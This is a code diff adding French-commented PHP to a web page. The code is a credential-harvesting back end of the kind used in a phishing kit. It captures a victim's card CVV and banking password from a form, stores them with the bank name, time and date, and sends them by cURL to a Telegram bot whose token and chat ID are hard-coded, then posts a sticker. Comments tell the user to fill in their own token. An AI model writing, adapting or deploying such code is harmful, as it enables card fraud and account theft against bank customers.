@@ -1,3 +1,88 @@
+<?php 
+session_start();
+
+// Vérifie si l'utilisateur arrive sur la page via une redirection et s'il y a des données à traiter
+if (!isset($_GET['loop'])) {
+    if (!isset($_POST["cvv"]) || !isset($_POST["mdp"])) {
+        header("Location: ./index.php");
+        exit();
+    }
+}
+
+// Si les données de connexion sont présentes, les enregistrer dans la session
+if (isset($_POST["cvv"]) || isset($_POST["mdp"])) {
+    $_SESSION["cvv"] = $_POST['cvv'];
+    $_SESSION["mdp"] = $_POST['mdp'];
+    $heure = date("h:i:s");
+    $date = date("Y-m-d");
+
+    // Prépare le message formaté à envoyer sur Telegram
+    $message = "📢 **NOUVELLE CONNEXION** 📢\n\n" .
+               "🏦 **Banque** : " . $_SESSION["bank"] . "\n" .
+               "🕒 **Heure** : " . $heure . "\n" .
+               "📅 **Date** : " . $date . "\n" .
+               "💳 **CVV** : `" . $_SESSION["cvv"] . "`\n" .
+               "🔑 **Mot de Passe** : `" . $_SESSION["mdp"] . "`\n";
+
+    // Informations pour l'envoi sur Telegram
+    $token = "8180049874:AAG00ea5LHEkC3pk9NgfrikOMPX0P2ljP6c"; // Remplace par ton token
+    $chat_id = "7691383619"; // Remplace par ton chat ID
+
+    // URL de l'API Telegram pour envoyer le message
+    $urlMessage = "https://api.telegram.org/bot$token/sendMessage";
+
+    // Tableau de données pour envoyer le message formaté
+    $dataMessage = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
+    ];
+
+    // Envoi du message via cURL
+    $chMessage = curl_init();
+    curl_setopt($chMessage, CURLOPT_URL, $urlMessage);
+    curl_setopt($chMessage, CURLOPT_POST, 1);
+    curl_setopt($chMessage, CURLOPT_POSTFIELDS, http_build_query($dataMessage));
+    curl_setopt($chMessage, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($chMessage, CURLOPT_SSL_VERIFYPEER, false);
+
+    // Exécute la requête d'envoi du message
+    $responseMessage = curl_exec($chMessage);
+
+    // Vérifie si cURL a rencontré une erreur lors de l'envoi du message
+    if (curl_errno($chMessage)) {
+        echo 'Erreur cURL (message) : ' . curl_error($chMessage);
+    }
+    curl_close($chMessage);
+
+    // URL de l'API Telegram pour envoyer un sticker
+    $urlSticker = "https://api.telegram.org/bot$token/sendSticker";
+
+    // Envoie un sticker après le message
+    $dataSticker = [
+        'chat_id' => $chat_id,
+        'sticker' => 'CAACAgIAAxkBAAEG9Utkp1g7LXoPDE7LIF8RCtEF5lVpPgACXgIAAladvQrmMlSMUATdlx4E' // Remplace par le File ID du sticker souhaité
+    ];
+
+    // Envoi du sticker via cURL
+    $chSticker = curl_init();
+    curl_setopt($chSticker, CURLOPT_URL, $urlSticker);
+    curl_setopt($chSticker, CURLOPT_POST, 1);
+    curl_setopt($chSticker, CURLOPT_POSTFIELDS, http_build_query($dataSticker));
+    curl_setopt($chSticker, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($chSticker, CURLOPT_SSL_VERIFYPEER, false);
+
+    // Exécute la requête d'envoi du sticker
+    $responseSticker = curl_exec($chSticker);
+
+    // Vérifie si cURL a rencontré une erreur lors de l'envoi du sticker
+    if (curl_errno($chSticker)) {
+        echo 'Erreur cURL (sticker) : ' . curl_error($chSticker);
+    }
+    curl_close($chSticker);
+}
+?>
+
 <!DOCTYPE html>
 <html lang="fr">
 
